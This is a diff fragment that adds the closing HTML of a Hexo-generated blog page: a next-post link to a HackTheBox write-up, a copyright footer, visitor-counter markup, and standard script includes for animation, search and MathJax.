+            </div>
+            <div class="post-nav-item">
+                <a href="/2022/01/07/HackTheBox-theNotebook/" rel="next" title="HackTheBox-theNotebook">
+                  HackTheBox-theNotebook <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Jason Tu</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="Total Visitors">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="Total Views">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdn.jsdelivr.net/npm/hexo-generator-searchdb@1.4.0/dist/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+  
+
+  <script class="next-config" data-name="enableMath" type="application/json">true</script><script class="next-config" data-name="mathjax" type="application/json">{"enable":true,"tags":"all","js":{"url":"https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js","integrity":"sha256-r+3itOMtGGjap0x+10hu6jW/gZCzxHsoKrOd7gyRSGY="}}</script>
+<script src="/js/third-party/math/mathjax.js"></script>
+
+
+
+</body>
+</html>
